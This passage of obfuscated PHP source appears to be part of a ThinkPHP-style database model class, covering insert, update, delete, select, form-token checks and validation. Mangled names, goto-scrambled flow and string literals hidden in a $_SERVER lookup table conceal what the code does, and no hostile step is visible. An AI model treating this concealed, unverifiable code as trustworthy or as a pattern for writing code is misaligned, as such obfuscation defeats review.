_facade($DßæÍÖä½•) { $dªåó×«¤Ï =& $_SERVER[åÌÛ»ô¢‚ö™]; if (!empty($this->fields)) { foreach ($DßæÍÖä½• as $e™Ã˜¨ã…Ë => $b‰ÔÅ‹šãˆ) { if (!in_array($e™Ã˜¨ã…Ë, $this->fields, !0)) { unset($DßæÍÖä½•[$e™Ã˜¨ã…Ë]); } elseif (is_scalar($b‰ÔÅ‹šãˆ)) { $this->_parseType($DßæÍÖä½•, $e™Ã˜¨ã…Ë); } } } if (!empty($this->options[$dªåó×«¤Ï[273]])) { $DßæÍÖä½• = array_map($this->options[$dªåó×«¤Ï[273]], $DßæÍÖä½•); unset($this->options[$dªåó×«¤Ï[273]]); } $this->_beforeWrite($DßæÍÖä½•); return $DßæÍÖä½•; } protected function _beforeWrite(&$FÖõŞËß¹) { } public function add($A‚®£·÷ì = '', $fåô·æÕ˜Ç = array(), $CÓ¥›­­ŸÇ = false) { goto FÏø‡éÇ¢³; AƒÍò£Ô˜: return $Fİˆ«ãâ³·; goto aè±‹›Í; FÏø‡éÇ¢³: if (empty($A‚®£·÷ì)) { if (!empty($this->data)) { $A‚®£·÷ì = $this->data; $this->data = array(); } else { $this->error = think_lang($_SERVER[åÌÛ»ô¢‚ö™][274]); return !1; } } $fåô·æÕ˜Ç = $this->_parseOptions($fåô·æÕ˜Ç); $A‚®£·÷ì = $this->_facade($A‚®£·÷ì); goto BÂµÁ¦£é«; BÂµÁ¦£é«: if (!1 === $this->_beforeInsert($A‚®£·÷ì, $fåô·æÕ˜Ç)) { return !1; } $Fİˆ«ãâ³· = $this->db->insert($A‚®£·÷ì, $fåô·æÕ˜Ç, $CÓ¥›­­ŸÇ); if (!1 !== $Fİˆ«ãâ³·) { $BÕ †í÷µØ = $this->getLastInsID(); if ($BÕ †í÷µØ) { $A‚®£·÷ì[$this->getPk()] = $BÕ †í÷µØ; $this->_after_insert($A‚®£·÷ì, $fåô·æÕ˜Ç); return $BÕ †í÷µØ; } $this->_after_insert($A‚®£·÷ì, $fåô·æÕ˜Ç); } goto AƒÍò£Ô˜; aè±‹›Í: } protected function _beforeInsert(&$DãÔĞçê‘, $fà¬ù§çÊí) { } protected function _after_insert($e¾¿ÛÔòˆ, $AĞ¢ÕãÆ¡–) { } public function addAll($Cµ®Æ°„Óó, $AùÈµ•İÜì = array(), $cÆé Ÿ˜¢È = false) { goto b«¦éœŞÍ; eùÛ‘§ÇÆ«: return $c¦‘Äâğ°Ÿ; goto fÒÁ¤†‘ÑÃ; b«¦éœŞÍ: $dÍÜçìøáÄ =& $_SERVER[åÌÛ»ô¢‚ö™]; if (empty($Cµ®Æ°„Óó)) { $this->error = think_lang($dÍÜçìøáÄ[274]); return !1; } $AùÈµ•İÜì = $this->_parseOptions($AùÈµ•İÜì); goto eÃÔ›à…Œã; eÃÔ›à…Œã: foreach ($Cµ®Æ°„Óó as $f±˜šØ‡ => $Eñˆ±ïì´¿) { $Cµ®Æ°„Óó[$f±˜šØ‡] = $this->_facade($Eñˆ±ïì´¿); } if (method_exists($this->db, $dÍÜçìøáÄ[275])) { $c¦‘Äâğ°Ÿ = $this->db->insertAll($Cµ®Æ°„Óó, $AùÈµ•İÜì, $cÆé Ÿ˜¢È); } else { $this->startTrans(); foreach ($Cµ®Æ°„Óó as $f±˜šØ‡ => $Eñˆ±ïì´¿) { $c¦‘Äâğ°Ÿ = $this->db->insert($Eñˆ±ïì´¿, $AùÈµ•İÜì, $cÆé Ÿ˜¢È); } $this->commit(); } if (!1 !== $c¦‘Äâğ°Ÿ) { $eáİª†ôÆ = $this->getLastInsID(); if ($eáİª†ôÆ) { return $eáİª†ôÆ; } } goto eùÛ‘§ÇÆ«; fÒÁ¤†‘ÑÃ: } public function selectAdd($Dìî‘Ëò‰â = '', $d¹²Ò¹‘ = '', $fãÖ‹–… = array()) { $b‰Æã±—„› =& $_SERVER[åÌÛ»ô¢‚ö™]; $fãÖ‹–… = $this->_parseOptions($fãÖ‹–…); if (!1 === ($aÖŸ–Ôğ÷‘ = $this->db->selectInsert($Dìî‘Ëò‰â ? $Dìî‘Ëò‰â : $fãÖ‹–…[$b‰Æã±—„›[276]], $d¹²Ò¹‘ ? $d¹²Ò¹‘ : $this->getTableName(), $fãÖ‹–…))) { $this->error = think_lang($b‰Æã±—„›[277]); return !1; } else { return $aÖŸ–Ôğ÷‘; } } public function save($câ’½øí¤¶ = '', $eÂÈÌ¤›„… = array()) { goto dåô¨ªˆÇë; dåô¨ªˆÇë: $C«§ñíİÂ =& $_SERVER[åÌÛ»ô¢‚ö™]; if (empty($câ’½øí¤¶)) { if (!empty($this->data)) { $câ’½øí¤¶ = $this->data; $this->data = array(); } else { $this->error = think_lang($C«§ñíİÂ[274]); return !1; } } $câ’½øí¤¶ = $this->_facade($câ’½øí¤¶); goto cË£ÕòÓ·; cË£ÕòÓ·: $eÂÈÌ¤›„… = $this->_parseOptions($eÂÈÌ¤›„…); $C×­Éã“ = $this->getPk(); if (!isset($eÂÈÌ¤›„…[$C«§ñíİÂ[278]])) { if (isset($câ’½øí¤¶[$C×­Éã“])) { $Eƒ²É¹Ó®[$C×­Éã“] = $câ’½øí¤¶[$C×­Éã“]; $eÂÈÌ¤›„…[$C«§ñíİÂ[278]] = $Eƒ²É¹Ó®; unset($câ’½øí¤¶[$C×­Éã“]); } else { $this->error = think_lang($C«§ñíİÂ[277]); return !1; } } goto fÉšÇËÜó¦; aÒñïßÄØ¾: if (!1 !== $Aö·ë°‚ËÚ) { if (isset($C×ùù²¬œ)) { $câ’½øí¤¶[$C×­Éã“] = $C×ùù²¬œ; } $this->_afterUpdate($câ’½øí¤¶, $eÂÈÌ¤›„…); } return $Aö·ë°‚ËÚ; goto dŞÇš‚£Ü; fÉšÇËÜó¦: if (is_array($eÂÈÌ¤›„…[$C«§ñíİÂ[278]]) && isset($eÂÈÌ¤›„…[$C«§ñíİÂ[278]][$C×­Éã“])) { $C×ùù²¬œ = $eÂÈÌ¤›„…[$C«§ñíİÂ[278]][$C×­Éã“]; } if (!1 === $this->_beforeUpdate($câ’½øí¤¶, $eÂÈÌ¤›„…)) { return !1; } $Aö·ë°‚ËÚ = $this->db->update($câ’½øí¤¶, $eÂÈÌ¤›„…); goto aÒñïßÄØ¾; dŞÇš‚£Ü: } protected function _beforeUpdate(&$CåÁ½Ì‰, $b‹‰õ¶ğÛ) { } protected function _afterUpdate($fÇ´ä‹ù÷, $Aº‡Å“ÒÂ) { } public function delete($b‚°®’êøÛ = array()) { goto A°Ü¤Îï; A°Ü¤Îï: $c«ŒÉ’â‡÷ =& $_SERVER[åÌÛ»ô¢‚ö™]; if (empty($b‚°®’êøÛ) && empty($this->options[$c«ŒÉ’â‡÷[278]])) { if (!empty($this->data) && isset($this->data[$this->getPk()])) { return $this->delete($this->data[$this->getPk()]); } else { return !1; } } $aÃ…¥£ßİ = $this->getPk(); goto fî‹…‡âšŒ; fî‹…‡âšŒ: if (is_numeric($b‚°®’êøÛ) || is_string($b‚°®’êøÛ)) { if (strpos($b‚°®’êøÛ, $c«ŒÉ’â‡÷[47])) { $eî‹Øßöàë[$aÃ…¥£ßİ] = array($c«ŒÉ’â‡÷[279], $b‚°®’êøÛ); } else { $eî‹Øßöàë[$aÃ…¥£ßİ] = $b‚°®’êøÛ; } $this->options[$c«ŒÉ’â‡÷[278]] = $eî‹Øßöàë; } $b‚°®’êøÛ = $this->_parseOptions(); if (is_array($b‚°®’êøÛ[$c«ŒÉ’â‡÷[278]]) && isset($b‚°®’êøÛ[$c«ŒÉ’â‡÷[278]][$aÃ…¥£ßİ])) { $A•§”¯¹÷± = $b‚°®’êøÛ[$c«ŒÉ’â‡÷[278]][$aÃ…¥£ßİ]; } goto dùÃ‘”œÇÔ; dùÃ‘”œÇÔ: $eİ­¡§ô—  = $this->db->delete($b‚°®’êøÛ); if (!1 !== $eİ­¡§ô— ) { $bªãâ”Æ´ = array(); if (isset($A•§”¯¹÷±)) { $bªãâ”Æ´[$aÃ…¥£ßİ] = $A•§”¯¹÷±; } $this->_after_delete($bªãâ”Æ´, $b‚°®’êøÛ); } return $eİ­¡§ô— ; goto a›Õœ¶ÏÜš; a›Õœ¶ÏÜš: } protected function _after_delete($C±¿áÄ÷¡, $AëÑŠÎ†Æ) { } public function select($dÛ·ç‹ïóĞ = array()) { goto aÖ Ø°×–î; FÆï¹ÖÜù: $this->_afterSelect($dù½–æ¼Œ‡, $dÛ·ç‹ïóĞ); return $dù½–æ¼Œ‡; goto Aøõ÷¦´Ô¢; aÖ Ø°×–î: $aáèÎÔ»¾ =& $_SERVER[åÌÛ»ô¢‚ö™]; if (is_string($dÛ·ç‹ïóĞ) || is_numeric($dÛ·ç‹ïóĞ)) { $eƒ›»›Çƒë = $this->getPk(); if (strpos($dÛ·ç‹ïóĞ, $aáèÎÔ»¾[47])) { $F¢àÕğöî[$eƒ›»›Çƒë] = array($aáèÎÔ»¾[279], $dÛ·ç‹ïóĞ); } else { $F¢àÕğöî[$eƒ›»›Çƒë] = $dÛ·ç‹ïóĞ; } $this->options[$aáèÎÔ»¾[278]] = $F¢àÕğöî; } elseif (!1 === $dÛ·ç‹ïóĞ) { $dÛ·ç‹ïóĞ = $this->_parseOptions(); return $aáèÎÔ»¾[280] . $this->db->buildSelectSql($dÛ·ç‹ïóĞ) . $aáèÎÔ»¾[281]; } $dÛ·ç‹ïóĞ = $this->_parseOptions(); goto FëˆÈ”¯Œ²; FëˆÈ”¯Œ²: $dù½–æ¼Œ‡ = $this->db->select($dÛ·ç‹ïóĞ); if (!1 === $dù½–æ¼Œ‡) { return !1; } if (empty($dù½–æ¼Œ‡)) { return null; } goto FÆï¹ÖÜù; Aøõ÷¦´Ô¢: } protected function _afterSelect(&$d²³’¯ŒäÚ, $fÕÈ¦â…) { } public function buildSql($D„°ÉÑø¾ = array()) { $AÖÌ”ÖãÅ¢ =& $_SERVER[åÌÛ»ô¢‚ö™]; $D„°ÉÑø¾ = $this->_parseOptions($D„°ÉÑø¾); return $AÖÌ”ÖãÅ¢[280] . $this->db->buildSelectSql($D„°ÉÑø¾) . $AÖÌ”ÖãÅ¢[281]; } public function optionsValue($aŞÉ£ç¿„Š = null) { if (is_null($aŞÉ£ç¿„Š)) { return $this->options; } elseif (is_array($aŞÉ£ç¿„Š)) { $this->options = array_merge($this->options, $aŞÉ£ç¿„Š); } } protected function _parseOptions($C‡Ş¬Ãäõ = array()) { goto B‚‘ Êƒ·Æ; B‚‘ Êƒ·Æ: $fø¨¸‰˜Ş‚ =& $_SERVER[åÌÛ»ô¢‚ö™]; if (is_array($C‡Ş¬Ãäõ)) { $C‡Ş¬Ãäõ = array_merge($this->options, $C‡Ş¬Ãäõ); } $this->options = array(); goto BğâíÈ¡Œ³; BğâíÈ¡Œ³: if (!isset($C‡Ş¬Ãäõ[$fø¨¸‰˜Ş‚[282]])) { $C‡Ş¬Ãäõ[$fø¨¸‰˜Ş‚[282]] = $this->getTableName(); $dÓš…ÚÄ÷Ğ = $this->fields; } else { $dÓš…ÚÄ÷Ğ = $this->getDbFields(); } if (!empty($C‡Ş¬Ãäõ[$fø¨¸‰˜Ş‚[283]])) { $C‡Ş¬Ãäõ[$fø¨¸‰˜Ş‚[282]] .= $fø¨¸‰˜Ş‚[50] . $C‡Ş¬Ãäõ[$fø¨¸‰˜Ş‚[283]]; } $C‡Ş¬Ãäõ[$fø¨¸‰˜Ş‚[284]] = $this->name; goto CÏŠ”ØØ«¦; CÏŠ”ØØ«¦: if (isset($C‡Ş¬Ãäõ[$fø¨¸‰˜Ş‚[278]]) && is_array($C‡Ş¬Ãäõ[$fø¨¸‰˜Ş‚[278]]) && !empty($dÓš…ÚÄ÷Ğ) && !isset($C‡Ş¬Ãäõ[$fø¨¸‰˜Ş‚[285]]) && !isset($C‡Ş¬Ãäõ[$fø¨¸‰˜Ş‚[282]])) { foreach ($C‡Ş¬Ãäõ[$fø¨¸‰˜Ş‚[278]] as $Eˆ‹ÃÏ«›Ğ => $CšÕÀáÖ÷†) { $Eˆ‹ÃÏ«›Ğ = trim($Eˆ‹ÃÏ«›Ğ); if (in_array($Eˆ‹ÃÏ«›Ğ, $dÓš…ÚÄ÷Ğ, !0)) { if (is_scalar($CšÕÀáÖ÷†)) { $this->_parseType($C‡Ş¬Ãäõ[$fø¨¸‰˜Ş‚[278]], $Eˆ‹ÃÏ«›Ğ); } } elseif (!is_numeric($Eˆ‹ÃÏ«›Ğ) && $fø¨¸‰˜Ş‚[70] != substr($Eˆ‹ÃÏ«›Ğ, 0, 1) && !1 === strpos($Eˆ‹ÃÏ«›Ğ, $fø¨¸‰˜Ş‚[91]) && !1 === strpos($Eˆ‹ÃÏ«›Ğ, $fø¨¸‰˜Ş‚[263]) && !1 === strpos($Eˆ‹ÃÏ«›Ğ, $fø¨¸‰˜Ş‚[286]) && !1 === strpos($Eˆ‹ÃÏ«›Ğ, $fø¨¸‰˜Ş‚[287])) { unset($C‡Ş¬Ãäõ[$fø¨¸‰˜Ş‚[278]][$Eˆ‹ÃÏ«›Ğ]); } } } $this->_options_filter($C‡Ş¬Ãäõ); return $C‡Ş¬Ãäõ; goto DÅêÖ½ ãË; DÅêÖ½ ãË: } protected function _options_filter(&$bÛ°Œ¼š„) { } protected function _parseType(&$f¢—­—‡Û, $FßÛšºö›‡) { $E“¦Ç³±Êß =& $_SERVER[åÌÛ»ô¢‚ö™]; if (empty($this->options[$E“¦Ç³±Êß[288]][$E“¦Ç³±Êß[4] . $FßÛšºö›‡])) { $d•çè¦µ’ = strtolower($this->fields[$E“¦Ç³±Êß[255]][$FßÛšºö›‡]); if (!1 !== strpos($d•çè¦µ’, $E“¦Ç³±Êß[289])) { } elseif (!1 === strpos($d•çè¦µ’, $E“¦Ç³±Êß[290]) && !1 !== strpos($d•çè¦µ’, $E“¦Ç³±Êß[291])) { $f¢—­—‡Û[$FßÛšºö›‡] = intval($f¢—­—‡Û[$FßÛšºö›‡]); } elseif (!1 !== strpos($d•çè¦µ’, $E“¦Ç³±Êß[292]) || !1 !== strpos($d•çè¦µ’, $E“¦Ç³±Êß[293])) { $f¢—­—‡Û[$FßÛšºö›‡] = floatval($f¢—­—‡Û[$FßÛšºö›‡]); } elseif (!1 !== strpos($d•çè¦µ’, $E“¦Ç³±Êß[294])) { $f¢—­—‡Û[$FßÛšºö›‡] = (bool) $f¢—­—‡Û[$FßÛšºö›‡]; } } } public function find($FôÜØ‘ÅÁà = array()) { goto b…›©µ÷óù; DíÛ©½îØµ: if (empty($Aï„”Æ‚¡Ê)) { return null; } $this->data = $Aï„”Æ‚¡Ê[0]; $this->_afterFind($this->data, $FôÜØ‘ÅÁà); goto C¥ÖÚÑ“Ö­; C¥ÖÚÑ“Ö­: if (!empty($this->options[$e²ªòó¤«[296]])) { return $this->returnResult($this->data, $this->options[$e²ªòó¤«[296]]); } return $this->data; goto A¨Öà’ğ½ã; b…›©µ÷óù: $e²ªòó¤« =& $_SERVER[åÌÛ»ô¢‚ö™]; if (is_numeric($FôÜØ‘ÅÁà) || is_string($FôÜØ‘ÅÁà)) { $Dô£¥æÎ±¤[$this->getPk()] = intval($FôÜØ‘ÅÁà); $this->options[$e²ªòó¤«[278]] = $Dô£¥æÎ±¤; } $this->options[$e²ªòó¤«[295]] = 1; goto aíñº®İñŠ; aíñº®İñŠ: $FôÜØ‘ÅÁà = $this->_parseOptions(); $Aï„”Æ‚¡Ê = $this->db->select($FôÜØ‘ÅÁà); if (!1 === $Aï„”Æ‚¡Ê) { return !1; } goto DíÛ©½îØµ; A¨Öà’ğ½ã: } protected function _afterFind(&$CÎ‚ŠŠè¼à, $bŒö¹ÊŸ) { } protected function returnResult($bƒ±îÏÇÎß, $D•½ØŒ‘‚ = '') { $F©“áÇÒåÛ =& $_SERVER[åÌÛ»ô¢‚ö™]; if ($D•½ØŒ‘‚) { if (is_callable($D•½ØŒ‘‚)) { return call_user_func($D•½ØŒ‘‚, $bƒ±îÏÇÎß); } switch (strtolower($D•½ØŒ‘‚)) { case $F©“áÇÒåÛ[297]: return json_encode($bƒ±îÏÇÎß); case $F©“áÇÒåÛ[298]: return xml_encode($bƒ±îÏÇÎß); } } return $bƒ±îÏÇÎß; } public function parseFieldsMap($a¢£è¹Ü—‹, $EàÖ®·ò¼£ = 1) { if (!empty($this->_map)) { foreach ($this->_map as $CÁÖŞØŒª¶ => $C®Şª©¨Õé) { if ($EàÖ®·ò¼£ == 1) { if (isset($a¢£è¹Ü—‹[$C®Şª©¨Õé])) { $a¢£è¹Ü—‹[$CÁÖŞØŒª¶] = $a¢£è¹Ü—‹[$C®Şª©¨Õé]; unset($a¢£è¹Ü—‹[$C®Şª©¨Õé]); } } else { if (isset($a¢£è¹Ü—‹[$CÁÖŞØŒª¶])) { $a¢£è¹Ü—‹[$C®Şª©¨Õé] = $a¢£è¹Ü—‹[$CÁÖŞØŒª¶]; unset($a¢£è¹Ü—‹[$CÁÖŞØŒª¶]); } } } } return $a¢£è¹Ü—‹; } public function setField($A˜¨ë›ì, $Cä·Í»æ«È = '') { if (is_array($A˜¨ë›ì)) { $A¦œìÅæÀ£ = $A˜¨ë›ì; } else { $A¦œìÅæÀ£[$A˜¨ë›ì] = $Cä·Í»æ«È; } return $this->save($A¦œìÅæÀ£); } public function setAdd($b‹ìó™Ï÷Ì, $Aá³‚£Ø¦£ = 1) { $b„Õù¢Î·í =& $_SERVER[åÌÛ»ô¢‚ö™]; $Bø†ì•­»Ñ = $b‹ìó™Ï÷Ì . $b„Õù¢Î·í[299] . $Aá³‚£Ø¦£; if ($Aá³‚£Ø¦£ < 0) { $Bø†ì•­»Ñ = $b‹ìó™Ï÷Ì . $Aá³‚£Ø¦£; } return $this->setField($b‹ìó™Ï÷Ì, array($b„Õù¢Î·í[300], $Bø†ì•­»Ñ)); } public function getField($E¨Ú«Ñğ, $aÎ¢º´í„› = null) { $Dòé¯½¼½ =& $_SERVER[åÌÛ»ô¢‚ö™]; $BÊÇÆØÛ°[$Dòé¯½¼½[276]] = $E¨Ú«Ñğ; $BÊÇÆØÛ° = $this->_parseOptions($BÊÇÆØÛ°); $E¨Ú«Ñğ = trim($E¨Ú«Ñğ); if (strpos($E¨Ú«Ñğ, $Dòé¯½¼½[47])) { if (!isset($BÊÇÆØÛ°[$Dòé¯½¼½[295]])) { $BÊÇÆØÛ°[$Dòé¯½¼½[295]] = is_numeric($aÎ¢º´í„›) ? $aÎ¢º´í„› : $Dòé¯½¼½[33]; } $EÊĞÁŸà² = $this->db->select($BÊÇÆØÛ°); if (!empty($EÊĞÁŸà²)) { goto a²—İÓ” Ä; a²—İÓ” Ä: $Aå´‘Š‡ƒ = explode($Dòé¯½¼½[47], $E¨Ú«Ñğ); $E¨Ú«Ñğ = array_keys($EÊĞÁŸà²[0]); $CÉºá¨¦¢“ = array_shift($E¨Ú«Ñğ); goto fÁ­½¶¼ÈŞ; Eğ„÷¦Ô­Ï: foreach ($EÊĞÁŸà² as $d¹¼²ÑòÁ) { $aá¥å£ë° = $d¹¼²ÑòÁ[$CÉºá¨¦¢“]; if (2 == $c£ÜÌ²…è®) { $cÎ©ÇéŒ‹[$aá¥å£ë°] = $d¹¼²ÑòÁ[$e­ğ±ÏØ“ê]; } else { $cÎ©ÇéŒ‹[$aá¥å£ë°] = is_string($aÎ¢º´í„›) ? implode($aÎ¢º´í„›, $d¹¼²ÑòÁ) : $d¹¼²ÑòÁ; } } return $cÎ©ÇéŒ‹; goto DµÇ£«ô½ã; fÁ­½¶¼ÈŞ: $e­ğ±ÏØ“ê = array_shift($E¨Ú«Ñğ); $cÎ©ÇéŒ‹ = array(); $c£ÜÌ²…è® = count($Aå´‘Š‡ƒ); goto Eğ„÷¦Ô­Ï; DµÇ£«ô½ã: } } else { if (!0 !== $aÎ¢º´í„›) { $BÊÇÆØÛ°[$Dòé¯½¼½[295]] = is_numeric($aÎ¢º´í„›) ? $aÎ¢º´í„› : 1; } if ($aÎ¢º´í„› === $Dòé¯½¼½[258]) { unset($BÊÇÆØÛ°[$Dòé¯½¼½[295]]); } $d¹¼²ÑòÁ = $this->db->select($BÊÇÆØÛ°); if (!empty($d¹¼²ÑòÁ)) { if ($aÎ¢º´í„› === $Dòé¯½¼½[258]) { return reset($d¹¼²ÑòÁ[0]); } if (!0 !== $aÎ¢º´í„› && 1 == $BÊÇÆØÛ°[$Dòé¯½¼½[295]]) { return reset($d¹¼²ÑòÁ[0]); } foreach ($d¹¼²ÑòÁ as $f¢–Ê’æŞ») { $d…§œÛËÌ[] = $f¢–Ê’æŞ»[$E¨Ú«Ñğ]; } return $d…§œÛËÌ; } } return null; } public function create($eÄƒ©·¢÷İ = '', $D¯é›¶ùø = '') { goto D÷¡Á˜¡Ş; aØ”­¹­: $eÄƒ©·¢÷İ = $this->parseFieldsMap($eÄƒ©·¢÷İ, 0); $D¯é›¶ùø = $D¯é›¶ùø ? $D¯é›¶ùø : (!empty($eÄƒ©·¢÷İ[$this->getPk()]) ? THINK_MODEL_UPDATE : THINK_MODEL_INSERT); if (isset($this->options[$D¦ÓêÜÛ‡Ó[276]])) { $CˆéÚòÈŠˆ = $this->options[$D¦ÓêÜÛ‡Ó[276]]; unset($this->options[$D¦ÓêÜÛ‡Ó[276]]); } elseif ($D¯é›¶ùø == THINK_MODEL_INSERT && isset($this->insertFields)) { $CˆéÚòÈŠˆ = $this->insertFields; } elseif ($D¯é›¶ùø == THINK_MODEL_UPDATE && isset($this->updateFields)) { $CˆéÚòÈŠˆ = $this->updateFields; } goto aÑÊ¼›Ê‹ ; D÷¡Á˜¡Ş: $D¦ÓêÜÛ‡Ó =& $_SERVER[åÌÛ»ô¢‚ö™]; if (empty($eÄƒ©·¢÷İ)) { $eÄƒ©·¢÷İ = $_POST; } elseif (is_object($eÄƒ©·¢÷İ)) { $eÄƒ©·¢÷İ = get_object_vars($eÄƒ©·¢÷İ); } if (empty($eÄƒ©·¢÷İ) || !is_array($eÄƒ©·¢÷İ)) { $this->error = think_lang($D¦ÓêÜÛ‡Ó[274]); return !1; } goto aØ”­¹­; dØëì”åºÄ: return $eÄƒ©·¢÷İ; goto e‘ËÚ÷Ò§; cÜõ¨Œ…¿: if ($this->autoCheckFields) { $CˆéÚòÈŠˆ = $this->getDbFields(); foreach ($eÄƒ©·¢÷İ as $F¨Š˜Í¶æÇ => $BšµË£ºÛœ) { if (!in_array($F¨Š˜Í¶æÇ, $CˆéÚòÈŠˆ)) { unset($eÄƒ©·¢÷İ[$F¨Š˜Í¶æÇ]); } elseif (MAGIC_QUOTES_GPC && is_string($BšµË£ºÛœ)) { $eÄƒ©·¢÷İ[$F¨Š˜Í¶æÇ] = stripslashes($BšµË£ºÛœ); } } } $this->autoOperation($eÄƒ©·¢÷İ, $D¯é›¶ùø); $this->data = $eÄƒ©·¢÷İ; goto dØëì”åºÄ; aÑÊ¼›Ê‹ : if (isset($CˆéÚòÈŠˆ)) { if (is_string($CˆéÚòÈŠˆ)) { $CˆéÚòÈŠˆ = explode($D¦ÓêÜÛ‡Ó[47], $CˆéÚòÈŠˆ); } if (think_config($D¦ÓêÜÛ‡Ó[301])) { $CˆéÚòÈŠˆ[] = think_config($D¦ÓêÜÛ‡Ó[302]); } foreach ($eÄƒ©·¢÷İ as $F¨Š˜Í¶æÇ => $BšµË£ºÛœ) { if (!in_array($F¨Š˜Í¶æÇ, $CˆéÚòÈŠˆ)) { unset($eÄƒ©·¢÷İ[$F¨Š˜Í¶æÇ]); } } } if (!$this->autoValidation($eÄƒ©·¢÷İ, $D¯é›¶ùø)) { return !1; } if (!$this->autoCheckToken($eÄƒ©·¢÷İ)) { $this->error = think_lang($D¦ÓêÜÛ‡Ó[303]); return !1; } goto cÜõ¨Œ…¿; e‘ËÚ÷Ò§: } public function autoCheckToken($a®‹É¶Ë‹®) { $AÍÚØÕÚêÖ =& $_SERVER[åÌÛ»ô¢‚ö™]; if (isset($this->options[$AÍÚØÕÚêÖ[304]]) && !$this->options[$AÍÚØÕÚêÖ[304]]) { return !0; } if (think_config($AÍÚØÕÚêÖ[301])) { $aš®›ÆÅâ× = think_config($AÍÚØÕÚêÖ[302]); if (!isset($a®‹É¶Ë‹®[$aš®›ÆÅâ×]) || Session::get($aš®›ÆÅâ×)) { return !1; } list($A‚Æ½Ö³, $c„š“ª£‰) = explode($AÍÚØÕÚêÖ[70], $a®‹É¶Ë‹®[$aš®›ÆÅâ×]); if ($c„š“ª£‰ && Session::get($aš®›ÆÅâ× . $AÍÚØÕÚêÖ[91] . $A‚Æ½Ö³) === $c„š“ª£‰) { Session::remove($aš®›ÆÅâ× . $AÍÚØÕÚêÖ[91] . $A‚Æ½Ö³); return !0; } if (think_config($AÍÚØÕÚêÖ[305])) { Session::remove($aš®›ÆÅâ× . $AÍÚØÕÚêÖ[91] . $A‚Æ½Ö³); } return !1; } return !0; } public function regex($fàĞ•Â«ß¹, $D¸Ô§ê²å¬) { $c›œ—óË„å =& $_SERVER[åÌÛ»ô¢‚ö™]; $fˆ£ë³œ’è = array($c›œ—óË„å[306] => $c›œ—óË„å[307], $c›œ—óË„å[308] => $c›œ—óË„å[309], $c›œ—óË„å[310] => $c›œ—óË„å[311], $c›œ—óË„å[312] => $c›œ—óË„å[313], $c›œ—óË„å[314] => $c›œ—óË„å[315], $c›œ—óË„å[316] => $c›œ—óË„å[317], $c›œ—óË„å[318] => $c›œ—óË„å[319], $c›œ—óË„å[293] => $c›œ—óË„å[320], $c›œ—óË„å[321] => $c›œ—óË„å[322]); if (isset($fˆ£ë³œ’è[strtolower($D¸Ô§ê²å¬)])) { $D¸Ô§ê²å¬ = $fˆ£ë³œ’è[strtolower($D¸Ô§ê²å¬)]; } return preg_match($D¸Ô§ê²å¬, $fàĞ•Â«ß¹) === 1; } private function autoOperation(&$F½ƒøªç‡Í, $cø–Æí¥—Ò) { $CÁàêæáÔî =& $_SERVER[åÌÛ»ô¢‚ö™]; if (!empty($this->options[$CÁàêæáÔî[323]])) { $A…ƒ¸˜‚ªÂ = $this->options[$CÁàêæáÔî[323]]; unset($this->options[$CÁàêæáÔî[323]]); } elseif (!empty($this->_auto)) { $A…ƒ¸˜‚ªÂ = $this->_auto; } if (isset($A…ƒ¸˜‚ªÂ)) { foreach ($A…ƒ¸˜‚ªÂ as $Fí°ƒÏÛ‚) { if (empty($Fí°ƒÏÛ‚[2])) { $Fí°ƒÏÛ‚[2] = THINK_MODEL_INSERT; } if ($cø–Æí¥—Ò == $Fí°ƒÏÛ‚[2] || $Fí°ƒÏÛ‚[2] == THINK_MODEL_BOTH) { switch (trim($Fí°ƒÏÛ‚[3])) { case $CÁàêæáÔî[324]: case $CÁàêæáÔî[325]: $Cƒ—•ä…ˆ™ = isset($Fí°ƒÏÛ‚[4]) ? (array) $Fí°ƒÏÛ‚[4] : array(); if (isset($F½ƒøªç‡Í[$Fí°ƒÏÛ‚[0]])) { array_unshift($Cƒ—•ä…ˆ™, $F½ƒøªç‡Í[$Fí°ƒÏÛ‚[0]]); } if ($CÁàêæáÔî[324] == $Fí°ƒÏÛ‚[3]) { $F½ƒøªç‡Í[$Fí°ƒÏÛ‚[0]] = call_user_func_array($Fí°ƒÏÛ‚[1], $Cƒ—•ä…ˆ™); } else { $F½ƒøªç‡Í[$Fí°ƒÏÛ‚[0]] = call_user_func_array(array(&$this, $Fí°ƒÏÛ‚[1]), $Cƒ—•ä…ˆ™); } break; case $CÁàêæáÔî[276]: $F½ƒøªç‡Í[$Fí°ƒÏÛ‚[0]] = $F½ƒøªç‡Í[$Fí°ƒÏÛ‚[1]]; break; case $CÁàêæáÔî[326]: if ($CÁàêæáÔî[33] === $F½ƒøªç‡Í[$Fí°ƒÏÛ‚[0]]) { unset($F½ƒøªç‡Í[$Fí°ƒÏÛ‚[0]]); } break; case $CÁàêæáÔî[327]: default: $F½ƒøªç‡Í[$Fí°ƒÏÛ‚[0]] = $Fí°ƒÏÛ‚[1]; } if (!1 === $F½ƒøªç‡Í[$Fí°ƒÏÛ‚[0]]) { unset($F½ƒøªç‡Í[$Fí°ƒÏÛ‚[0]]); } } } } return $F½ƒøªç‡Í; } protected function autoValidation($bÉ¬ÇÉ¸³¶, $aä£ Æİ’) { $båÈ¦°Š‡ =& $_SERVER[åÌÛ»ô¢‚ö™]; if (!empty($this->options[$båÈ¦°Š‡[328]])) { $bºÌ‚›Ùî = $this->options[$båÈ¦°Š‡[328]]; unset($this->options[$båÈ¦°Š‡[328]]); } elseif (!empty($this->_validate)) { $bºÌ‚›Ùî = $this->_validate; } if (isset($bºÌ‚›Ùî)) { if ($this->patchValidate) { $this->error = array(); } foreach ($bºÌ‚›Ùî as $fìôÛ·ã—¿ => $e«Ã­˜Îƒ) { if (empty($e«Ã­˜Îƒ[5]) || $e«Ã­˜Îƒ[5] == THINK_MODEL_BOTH || $e«Ã­˜Îƒ[5] == $aä£ Æİ’) { if (0 == strpos($e«Ã­˜Îƒ[2], $båÈ¦°Š‡[329]) && strpos($e«Ã­˜Îƒ[2], $båÈ¦°Š‡[330])) { $e«Ã­˜Îƒ[2] = think_lang(substr($e«Ã­˜Îƒ[2], 2, -1)); } $e«Ã­˜Îƒ[3] = isset($e«Ã­˜Îƒ[3]) ? $e«Ã­˜Îƒ[3] : THINK_EXISTS_VALIDATE; $e«Ã­˜Îƒ[4] = isset($e«Ã­˜Îƒ[4]) ? $e«Ã­˜Îƒ[4] : $båÈ¦°Š‡[331]; switch ($e«Ã­˜Îƒ[3]) { case THINK_MUST_VALIDATE: if (!1 === $this->_validationField($bÉ¬ÇÉ¸³¶, $e«Ã­˜Îƒ)) { return !1; } break; case THINK_VALUE_VALIDATE: if ($båÈ¦°Š‡[33] != 